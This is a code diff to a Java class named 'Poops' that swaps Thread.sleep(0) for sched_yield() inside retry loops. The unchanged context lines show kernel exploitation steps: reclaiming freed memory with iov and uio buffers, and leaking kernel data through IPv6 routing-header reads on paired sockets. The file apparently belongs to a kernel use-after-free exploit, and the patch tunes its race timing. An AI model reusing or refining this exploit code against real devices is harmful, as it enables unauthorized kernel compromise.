@@ -628,7 +628,7 @@ public class Poops {
                 }
             }
             attempts++;
-            try { Thread.sleep(0); } catch (Exception ignored) {}
+            sched_yield();
         }
         return false;
     }
@@ -654,7 +654,7 @@ public class Poops {
                 return j;
             }
             attempts++;
-            try { Thread.sleep(0); } catch (Exception ignored) {}
+            sched_yield();
         }
         return -1;
     }
@@ -739,11 +739,7 @@ public class Poops {
         for (int i = 0; i < 32; i++) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             // Release buffers.
             write(iovSs1, tmp, Int8.SIZE);
@@ -773,11 +769,7 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             leakRthdrLen.set(Int64.SIZE);
             getRthdr(ipv6Socks[twins[0]], leakRthdr, leakRthdrLen);
@@ -846,11 +838,7 @@ public class Poops {
             }
 
             close(kq);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
             attempts++;
         }
         
@@ -910,11 +898,7 @@ public class Poops {
         // Reclaim with uio.
         while (true) {
             uioState.signalWork(COMMAND_UIO_READ);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x10);
@@ -949,11 +933,7 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x40);
@@ -1015,11 +995,7 @@ public class Poops {
         // Reclaim with uio.
         while (true) {
             uioState.signalWork(COMMAND_UIO_WRITE);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x10);
@@ -1049,11 +1025,7 @@ public class Poops {
         while (true) {
             // Reclaim with iov.
             iovState.signalWork(0);
-            try {
-            Thread.sleep(0);
-        } catch (InterruptedException e) {
-            Thread.currentThread().interrupt();
-        }
+            sched_yield();
 
             // Leak with other rthdr.
             leakRthdrLen.set(0x40);
